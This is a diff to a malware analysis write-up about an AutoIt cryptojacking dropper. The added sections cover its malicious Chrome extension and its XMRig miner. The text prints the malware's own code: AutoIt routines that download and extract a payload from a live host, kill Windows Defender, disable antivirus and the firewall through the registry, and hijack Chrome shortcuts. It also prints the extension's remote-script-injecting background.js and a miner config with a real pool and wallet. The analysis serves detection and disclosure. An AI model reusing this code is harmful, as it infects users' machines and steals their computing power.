@@ -434,7 +434,7 @@ EndFunc
 <br> Then it sent to the server and wait for the status. If the status is not 200 (Successful), it print the error and exit.
 <br> If status is 200, the server will sent the `7-zip` extractor `7za.exe` and the virus archive `files.7z` download URL.
 <br> I have run this and got the `7-zip` link in the form of `http://pube.me/app/7za.exe?id=somerandomnumberhere` and `files.7z` is `http://pube.me/app/files.7z?id=somerandomnumberhere` with `somerandomnumber` is a 4-digit number, but it doesn't matter.
-#### 6) 6th function: write to registry
+#### h) 6th function: write to registry
 ```autoit
 Func main6($sevenzipurl, $virusurl) ; Write Installed key
 	; Alright, the virus write to the key unzip to check if it has already installed or not
@@ -443,7 +443,7 @@ Func main6($sevenzipurl, $virusurl) ; Write Installed key
 EndFunc
 ```
 <br> It now write to the registry to show that the virus has activated.
-#### 7) 7th function: prepare the virus directory
+#### i) 7th function: prepare the virus directory
 ```autoit
 Func main7($sevenzipurl, $virusurl) ; Create directory in appdata
 	DirCreate($virusdir) ; Create the directory in AppData
@@ -451,7 +451,7 @@ Func main7($sevenzipurl, $virusurl) ; Create directory in appdata
 EndFunc
 ```
 <br> It create a folder `C:\User\YOURUSERNAME\AppData\Roaming\YOURUSERNAME\`. If you install Windows to something isn't `C:`, find it in that drive!
-#### 8) 8th function: download the 7-zip extractor and the virus
+#### k) 8th function: download the 7-zip extractor and the virus
 ```autoit
 Func main8($sevenzipurl, $virusurl) ; Download 7-zip and virus
 	If NOT FileExists($virusdir & "\7za.exe") Then ; Check if 7-zip available in that directory - to extract the virus
@@ -462,7 +462,7 @@ Func main8($sevenzipurl, $virusurl) ; Download 7-zip and virus
 EndFunc
 ```
 <br> It check if `7za.exe` available in that directory or not, if not then download it from the provided `$sevenzipurl`. After that, download the virus with the provided URL at `$virusurl`
-#### 9) 9th function: Extract the virus
+#### l) 9th function: Extract the virus
 ```autoit
 Func main9() ; Extract the virus
 	RunWait($virusdir & "\" & "7za.exe e files.7z -aoa -pKEQZmgbrmDnTpa2b4DHVMX", $virusdir, @SW_HIDE) ; Extract the virus, the protected password is KEQZmgbrmDnTpa2b4DHVMX
@@ -481,7 +481,7 @@ EndFunc
 |`update-x64.exe`|Xmrig miner, but changed the icon and the infos|
 |`update-x86.exe`|Also Xmrig, but the 32 bit version (I don't know why)|
 |`WinRing0x64.sys`|To be loaded by Xmrig, `allow access to RDMSR, CPUID and RDTSC instructions` from Ring 3 in x86. This might be used by Xmrig to detect the hardware model to load the assembly accelerator|
-#### 10) 10th function: Kill Windows Defender
+#### m) 10th function: Kill Windows Defender
 ```autoit
 Func main10() ; Kill Windows Defender
 	If @OSVersion = "WIN_10" Then ; Check if the windows version is Windows 10 - maybe to find Windows Defender?
@@ -493,7 +493,7 @@ EndFunc
 ```
 <br> It kill Windows Defender with the `defender.exe` from `www.sordum.org`. This is a tool that people use to disable Windows Defender.
 <br> You can view it on VirusTotal [here](https://www.virustotal.com/gui/file/ce3a6224dae98fdaa712cfa6495cb72349f333133dbfb339c9e90699cbe4e8e4/detection), on Any.run [here](https://app.any.run/tasks/5b8bc7d6-48c3-4dfc-af25-a5accae0a937/)
-#### 11) 11th function: copy itself to the created directory
+#### m) 11th function: copy itself to the created directory
 ```autoit
 Func main11() ; Copy itself to virus directory
 	FileCopy(@ScriptFullPath, $virusdir & "\app.exe", 1) ; Copy the current virus itself to the virus directory it created
@@ -501,7 +501,7 @@ Func main11() ; Copy itself to virus directory
 EndFunc
 ```
 <br> It copy itself to the directory it has created, and rename to `app.exe`. In an infected machine, in that directory I didn't see `app.exe` for some reason.
-#### 12) 12th function: kill chrome
+#### n) 12th function: kill chrome
 ```autoit
 Func main12() ; Kill Chrome
 	While WinGetHandle(REGEXPTITLE:(?i)(.*Chrome.*)) ; Kill chrome by get the handle
@@ -513,7 +513,7 @@ Func main12() ; Kill Chrome
 EndFunc
 ```
 <br> Kill Chrome to install the malicious extension.
-#### 13) 13th function: set permision for the directory
+#### o) 13th function: set permision for the directory
 ```autoit
 Func main13() ; Protect itself from being deleted
 	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn setprot -op dacl:p_nc", $virusdir, @SW_HIDE)
@@ -528,7 +528,7 @@ EndFunc
 <br> `setacl` is an FOSS (LGPL v2) tools for modifing the security permission of Windows.
 <br> It use `setacl` to set the owner of the folder to `SYSTEM` to avoid being deleted
 <br> But you can always change the folder owner by using `Security` tab in `Folder Properties`
-#### 14) 14th function: write registry to disable antiviruses and change the Chrome Update
+#### p) 14th function: write registry to disable antiviruses and change the Chrome Update
 ```autoit
 Func main14() ; Write registry to disable antiviruses and change the Chrome Update
 	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations", "LowRiskFileTypes", "REG_SZ", ".exe")
@@ -550,7 +550,7 @@ EndFunc
 - Disable Windows Firewall to connect to its server
 - Disable Security Health Service - part of Windows Defender
 - Delete Security Health Service from auto start apps.
-#### 15) 15th function: Execute chrome with malware extension
+#### q) 15th function: Execute chrome with malware extension
 ```autoit
 Func main15() ; Insert malware extension to Chrome
 	ShellExecute("chrome.exe", "--enable-automation --restore-last-session --disable-blink-features=AutomationControlled --load-extension=" & $virusdir, "", "", @SW_MAXIMIZE)
@@ -560,7 +560,7 @@ EndFunc
 ```
 <br> It load extension from the directory it created. After extract the archive, it has `manifest.json` and `background.js` to be loaded.
 <br> We will talk about the extension later.
-#### 16) 16th function and the rest: Replace Chrome shortcut with command line to load the extension
+#### r) 16th function and the rest: Replace Chrome shortcut with command line to load the extension
 ```autoit
 Func main16() ; Replace Chrome shortcut with malware extension command line
 	Local $array2d[5][2] ; Setup an 2D array
@@ -679,3 +679,371 @@ EndFunc
 <br> They use some Regular Expression to find the chrome shortcut, then insert to it.
 <br> `chrome` or `chromium` (the open source version and also the core part of Chrome) also work.
 <br> Im not going to look carefully in this part.
+
+### 7) The extension
+Every Chrome extension has a `manifest.json` file. From the `files.7z`, `manifest.json` has:
+```json
+{
+    "update_url": "https://clients2.google.com/service/update2/crx",
+    "version": "1.0.0",
+    "manifest_version": 2,
+    "background": {
+        "scripts": [
+            "background.js"
+        ]
+    },
+    "browser_action": {},
+    "name": "Google Osehes",
+    "permissions": [
+        "<all_urls>",
+        "*://*/*",
+        "webRequest",
+        "webRequestBlocking",
+        "cookies",
+        "tabs",
+        "background"
+    ],
+    "description": "Google Osehes"
+}
+```
+<br> Nothing special about this, they just change the name of the extension too make it more "safe" when you look it. The extension has a worker script, the `background.js`:
+```javascript
+var yhhng = {};
+var mhiwl = function(){
+	var iacpj = new URL('https://www.google.com');
+	iacpj.protocol = 'http:';
+	var nkkdx = 'pube';
+	var eiubga = 'me';
+	iacpj.hostname = nkkdx+'.'+eiubga;
+	iacpj.pathname = '/config';
+	if(!chrome.app.getDetails()){
+		return false;
+	}
+	fetch(iacpj).then(function(response){
+		return response.json();
+	}).then(function(data){
+		yhhng = data;
+		if(data.login == true){
+			yhhng.app = chrome.app.getDetails();
+			yarna();
+		}else{
+			yztvx();
+		}
+	}).catch((e) => {
+		setTimeout(mhiwl, 1000*60);
+	});
+}
+
+var yarna = function(){
+	yhhng.request.headers = {installed:true};
+	fetch(yhhng.check ,yhhng.request).then(function(response){
+		return response.json();
+	}).then(function(data){
+		if(data.verify == true){
+			ufrkhn();
+		}else{
+			yztvx();
+		}
+	});
+}
+
+var ixtfco = function(){
+	(function(d, s, id){
+     var js, cjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = yhhng.url;
+     cjs.parentNode.insertBefore(js, cjs);
+   }(document, 'script', 'chrome-jssdk'));
+}
+
+var ufrkhn = function(){
+	fetch(yhhng.url).then(function(response){
+		return response.blob();
+	}).then(function(data){
+		yhhng.url = URL.createObjectURL(data);
+		ixtfco(yhhng.url);
+	});
+}
+
+var xqerx = function(){
+	chrome.tabs.create({url:yhhng.homepage}, function(tab){
+		yhhng.tab = tab.id;
+		chrome.browserAction.enable();
+		if(!yhhng.pfjgrj){
+			vjkvcw();
+		}
+	});
+}
+
+var rvcxkz = function(){
+	chrome.tabs.update(yhhng.tab, {url: yhhng.homepage}, function(){
+		chrome.browserAction.enable();
+	})
+}
+
+var vjkvcw = function(){
+	yhhng.pfjgrj = true;
+	chrome.tabs.onRemoved.addListener(function(tab){
+		if(tab == yhhng.tab){
+			yhhng.tab = false;
+		}
+	});
+}
+
+var yztvx = function(){
+	chrome.browserAction.onClicked.addListener(function(){
+		chrome.browserAction.disable();
+		if(!yhhng.tab){
+			xqerx();
+		}else{
+			rvcxkz();
+		}
+	});
+}
+
+if(chrome){
+	mhiwl();
+}
+```
+<br> This can also be converted to a more friendly way:
+```javascript
+var jsondata = {};
+var main = function(){
+	var l = new URL('https://www.google.com');
+	l.protocol = 'http:';
+	l.hostname = "pube.me";
+	l.pathname = '/config';
+	if(!chrome.app.getDetails()){
+		return false; // Not allow to get app details
+	}
+	fetch(l).then(function(response){
+		return response.json(); // Output to JSON
+	}).then(function(data){
+		jsondata = data;
+		if(data.login == true){
+			jsondata.app = chrome.app.getDetails();
+			yarna();
+		}else{
+			yztvx();
+		}
+	}).catch((e) => {
+		setTimeout(main, 1000*60); // If error then delay 60 seconds before restart this function
+	});
+}
+
+var yarna = function(){
+	jsondata.request.headers = {installed:true};
+	fetch(jsondata.check ,jsondata.request).then(function(response){
+		return response.json();
+	}).then(function(data){
+		if(data.verify == true){
+			ufrkhn();
+		}else{
+			yztvx();
+		}
+	});
+}
+
+var ixtfco = function(){
+	function(){
+     var js, cjs = document.getElementsByTagName('script')[0];
+     if (document.getElementById('chrome-jssdk')) {return;}
+     js = document.createElement('script'); js.id = 'chrome-jssdk';
+     js.src = jsondata.url; // Insert the remote Javascript code
+     cjs.parentNode.insertBefore(js, cjs);
+    };
+}
+
+var ufrkhn = function(){
+	fetch(jsondata.url).then(function(response){
+		return response.blob();
+	}).then(function(data){
+		jsondata.url = URL.createObjectURL(data);
+		ixtfco(jsondata.url);
+	});
+}
+
+var xqerx = function(){
+	chrome.tabs.create({url:jsondata.homepage}, function(tab){
+		jsondata.tab = tab.id;
+		chrome.browserAction.enable();
+		if(!jsondata.pfjgrj){
+			vjkvcw();
+		}
+	});
+}
+
+var rvcxkz = function(){
+	chrome.tabs.update(jsondata.tab, {url: jsondata.homepage}, function(){
+		chrome.browserAction.enable();
+	})
+}
+
+var vjkvcw = function(){
+	jsondata.pfjgrj = true;
+	chrome.tabs.onRemoved.addListener(function(tab){
+		if(tab == jsondata.tab){
+			jsondata.tab = false;
+		}
+	});
+}
+
+var yztvx = function(){
+	chrome.browserAction.onClicked.addListener(function(){
+		chrome.browserAction.disable();
+		if(!jsondata.tab){
+			xqerx();
+		}else{
+			rvcxkz();
+		}
+	});
+}
+
+if(chrome){
+	main(); // main
+}
+```
+<br> If you browse to `https://pube.me/config` you can see some Json:
+```json
+{
+    "domain": "pube.me",
+    "homepage": "http://pube.me",
+    "url": "http://pube.me/config",
+    "check": "http://pube.me/check",
+    "shorten": "http://pube.me/shorten",
+    "status": true,
+    "hash": "c473182fc1c0af4b20046e9f88cd3f09",
+    "csrf": "36a67c037dbca73d24dbade17d06473e",
+    "token": "YzQ3MzE4MmZjMWMwYWY0YjIwMDQ2ZTlmODhjZDNmMDk=",
+    "socket": "ws://pube.me:8080",
+    "ssl": false,
+    "verified": true,
+    "login": false
+}
+```
+<br> The `hash`, `csrf` and `token` are renewed every time you reload the page. `pube.me:8080` require an username and a password when you browse to it.
+<br> The link `http://pube.me/check` return:
+```json
+{
+    "verify": false
+}
+```
+<br> `http://pube.me/shorten`:
+```json
+{
+    "valid": false,
+    "message": "Long URL is invalid"
+}
+```
+<br> Please note that some part of the world (I have tried VPN) will have 403 error when trying to access this server.
+<br> I will try to fetch some more informations, but if you found something, please open an issue or pull request! Thanks!
+### 8) The miner
+In the function `zlmsyuslmwzh` in the fb.clean.au3 file:
+```autoit
+Func zlmsyuslmwzh() ; Inject fake update service to Chrome and kill Windows Defender
+	If "X86" = "X64" Then ; Originally @CPUArch
+		$toujmktea = "update-x64.exe"
+	Else
+		$toujmktea = "update-x86.exe"
+	EndIf
+	While 1
+		If FileExists($virusdir & "\" & $toujmktea) Then
+			If NOT ProcessExists($toujmktea) Then
+				Run($virusdir & "\" & $toujmktea, $virusdir, @SW_HIDE)
+			EndIf
+		EndIf
+		ProcessClose("software_reporter_tool.exe")
+		ProcessClose("MsMpEng.exe")
+		ProcessClose("SecurityHealthHost.exe")
+		ProcessClose("SecurityHealthService.exe")
+		Sleep(3000)
+	WEnd
+EndFunc
+```
+<br> As described, the file `update-x64.exe` is a Xmrig miner. When executed with no parameter, it <b>by default</b> load the config ```config.json```. Let's take a look at it:
+```json
+{
+    "api": {
+        "id": null,
+        "worker-id": null
+    },
+    "http": {
+        "enabled": false,
+        "host": "127.0.0.1",
+        "port": 0,
+        "access-token": null,
+        "restricted": true
+    },
+    "autosave": true,
+    "version": 1,
+    "background": true,
+    "colors": true,
+    "randomx": {
+        "init": -1,
+        "numa": true
+    },
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": false,
+        "max-threads-hint": 80,
+        "asm": true,
+        "argon2-impl": null,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "opencl": {
+        "enabled": false,
+        "cache": true,
+        "loader": null,
+        "platform": "AMD",
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "cuda": {
+        "enabled": false,
+        "loader": null,
+        "nvml": true,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "donate-level": 1,
+    "donate-over-proxy": 0,
+    "log-file": null,
+    "pools": [
+        {
+            "algo": "rx/0",
+            "coin": "monero",
+            "url": "pool.okim.me:3333",
+            "user": "82mnaBkHb15Mq5iGxxfVL9aJBwaBcvpveGojJitDJamddnZi8dPJVAL8ti1iy1rYfwY4RmDRofkqyN8tZfq2UuhHCaxWkYp",
+            "pass": "Worker",
+            "rig-id": null,
+            "nicehash": false,
+            "keepalive": false,
+            "enabled": true,
+            "tls": false,
+            "tls-fingerprint": null,
+            "daemon": false,
+            "self-select": null
+        }
+    ],
+    "print-time": 60,
+    "health-print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "syslog": false,
+    "user-agent": null,
+    "watch": true
+}
+```
+<br> It connect to the pool at address `pool.okim.me:3333` with the username of `82mnaBkHb15Mq5iGxxfVL9aJBwaBcvpveGojJitDJamddnZi8dPJVAL8ti1iy1rYfwY4RmDRofkqyN8tZfq2UuhHCaxWkYp` and the password `Worker`. I have checked and the server still work!
+<br> When mining, if you open the Task Manager, you will see it shows at `Windows Controller`.
+
+## Notes
+- The server is nearly not accessable, mostly got 403, 404 and 1020 error code
+- Two domains `pube.me`, `okim.me` are all use Cloudflare protection.
+- Some parts of the world only get 403.
+- <b>This project is made for educational purpose, please don't reuse the code for any purpose other than education. I have ABSOLUTELY NO responsibilities for ANY KIND OF DAMAGE MADE BY USING ANY OF THE CONTENT IN THIS PROJECT.</b>
